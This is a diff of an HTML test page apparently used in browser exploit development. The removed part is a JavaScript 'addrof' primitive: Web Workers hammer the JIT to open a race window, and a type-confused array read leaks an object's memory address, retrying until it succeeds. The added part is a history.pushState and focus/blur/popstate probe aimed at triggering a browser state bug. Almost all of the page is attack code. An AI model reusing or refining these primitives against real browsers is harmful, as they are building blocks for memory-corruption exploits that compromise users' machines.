@@ -1,60 +1,30 @@
 <!DOCTYPE html>
 <html><body>
-<h1 id="s">Running...</h1>
+<h1 id="s">Testing...</h1>
 <script>
-var wCode = `
-  function jit(o){return o.a+o.b;}
-  for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
-  while(true){
-    var arr=[];
-    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1});
-    jit(arr[0]);
-    arr=null;
-  }
-`;
-var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
-for(var i=0;i<6;i++) new Worker(u);
+// SSV allocation test
+history.replaceState("dummy", "");
+history.pushState({x: new Array(1000).fill(1.1)}, "", "#test1");
+history.pushState({x: new Array(1000).fill(1.1)}, "", "#test2");
 
-// addrof — donma sırasında çalışacak
-function addrof(val) {
-  var arr = [1.1, 2.2, 3.3];
-  function rd(a) { return a[0]; }
-  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
-  arr[0] = val;
-  return rd(arr);
-}
+var input = document.createElement("input");
+document.body.appendChild(input);
 
-var target = {secret: 0x1337};
-var attempts = 0;
-
-function tryAddrof() {
-  attempts++;
-  var leaked = addrof(target);
-  
-  var buf = new ArrayBuffer(8);
-  var dv = new DataView(buf);
-  dv.setFloat64(0, leaked, true);
-  var lo = dv.getUint32(0,true);
-  var hi = dv.getUint32(4,true);
-  
-  var isNaN_val = (hi === 0x7ff80000 && lo === 0);
-  
-  if (!isNaN_val) {
-    document.getElementById('s').textContent = 
-      '✅ GOT IT [attempt '+attempts+']: 0x'+
-      hi.toString(16).padStart(8,'0')+
-      lo.toString(16).padStart(8,'0');
-    return; // dur
-  }
-  
+var blurCount = 0;
+input.addEventListener("blur", function() {
+  blurCount++;
   document.getElementById('s').textContent = 
-    'attempt '+attempts+' — NaN, retrying...';
-  
-  // Tekrar dene — race window'u yakalayana kadar
-  setTimeout(tryAddrof, 10);
-}
+    'blur fired: ' + blurCount + ' | state: ' + JSON.stringify(history.state);
+});
 
-// Workers ısınana kadar bekle, sonra başla
-setTimeout(tryAddrof, 2000);
+input.addEventListener("focus", function() {
+  history.back();
+});
+
+document.addEventListener("popstate", function(e) {
+  document.getElementById('s').textContent += ' | pop: ' + JSON.stringify(e.state).substring(0,50);
+});
+
+input.focus();
 </script>
 </body></html>
